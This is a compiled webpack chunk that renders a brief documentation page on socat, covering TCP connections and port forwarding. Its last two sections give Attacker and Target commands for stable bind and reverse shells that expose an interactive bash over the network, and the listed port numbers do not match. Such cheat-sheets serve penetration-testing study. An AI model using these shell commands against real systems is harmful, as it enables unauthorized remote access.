"use strict";
(self.webpackChunkdocs = self.webpackChunkdocs || []).push([
  [4739],
  {
    1531: (t, e, s) => {
      s.r(e),
        s.d(e, {
          assets: () => p,
          contentTitle: () => c,
          default: () => h,
          frontMatter: () => r,
          metadata: () => i,
          toc: () => d,
        });
      var a = s(7462),
        o = s(3366),
        n = (s(7294), s(3905)),
        l = (s(828), ["components"]),
        r = {},
        c = "Socat",
        i = {
          unversionedId: "unix/tools/socat",
          id: "unix/tools/socat",
          title: "Socat",
          description:
            "Socat is an all-purpose networking tool, similar to Netcat.",
          source: "@site/docs/unix/tools/socat.md",
          sourceDirName: "unix/tools",
          slug: "/unix/tools/socat",
          permalink: "/docs/unix/tools/socat",
          draft: !1,
          tags: [],
          version: "current",
          frontMatter: {},
          sidebar: "tutorialSidebar",
          previous: { title: "sed", permalink: "/docs/unix/tools/sed" },
          next: { title: "ss", permalink: "/docs/unix/tools/ss" },
        },
        p = {},
        d = [
          { value: "Port forwarding", id: "port-forwarding", level: 2 },
          { value: "Bind shell", id: "bind-shell", level: 2 },
          { value: "Reverse shell", id: "reverse-shell", level: 2 },
        ],
        u = { toc: d };
      function h(t) {
        var e = t.components,
          s = (0, o.Z)(t, l);
        return (0, n.kt)(
          "wrapper",
          (0, a.Z)({}, u, s, { components: e, mdxType: "MDXLayout" }),
          (0, n.kt)("h1", { id: "socat" }, "Socat"),
          (0, n.kt)(
            "p",
            null,
            (0, n.kt)("strong", { parentName: "p" }, "Socat"),
            " is an all-purpose networking tool, similar to ",
            (0, n.kt)(
              "a",
              { parentName: "p", href: "/docs/unix/tools/netcat" },
              "Netcat"
            ),
            ".\nFor example, to open a ",
            (0, n.kt)(
              "a",
              { parentName: "p", href: "../../network/protocols/tcp" },
              "TCP"
            ),
            " connection run"
          ),
          (0, n.kt)(
            "pre",
            null,
            (0, n.kt)(
              "code",
              { parentName: "pre", className: "language-sh" },
              "socat - tcp:localhost:8080\n"
            )
          ),
          (0, n.kt)(
            "p",
            null,
            "The ",
            (0, n.kt)("inlineCode", { parentName: "p" }, "-"),
            " indicates that standard IO should be streamed over the connection."
          ),
          (0, n.kt)("h2", { id: "port-forwarding" }, "Port forwarding"),
          (0, n.kt)("p", null, "Socat can do port forwarding such as"),
          (0, n.kt)(
            "pre",
            null,
            (0, n.kt)(
              "code",
              { parentName: "pre", className: "language-sh" },
              "socat tcp-listen:8081,fork,reuseaddr tcp:localhost:8080\n"
            )
          ),
          (0, n.kt)("h2", { id: "bind-shell" }, "Bind shell"),
          (0, n.kt)(
            "p",
            null,
            "You can create stable bind shells with socat using"
          ),
          (0, n.kt)(
            "pre",
            null,
            (0, n.kt)(
              "code",
              { parentName: "pre", className: "language-sh" },
              'Target > socat tcp-listen:8081 exec:"bash -li",pty,stderr,sigint,setsid,sane\nAttacker > socat file:`tty`,raw,echo=0 tcp:localhost:8085\n'
            )
          ),
          (0, n.kt)("h2", { id: "reverse-shell" }, "Reverse shell"),
          (0, n.kt)(
            "p",
            null,
            "Socat can be used to obtain stable reverse shells using"
          ),
          (0, n.kt)(
            "pre",
            null,
            (0, n.kt)(
              "code",
              { parentName: "pre", className: "language-sh" },
              'Attacker > socat file:`tty`,raw,echo=0 tcp-listen:8080\nTarget > socat exec:"bash -li",pty,stderr,sigint,setsid,sane tcp:localhost:8084\n'
            )
          )
        );
      }
      h.isMDXComponent = !0;
    },
  },
]);
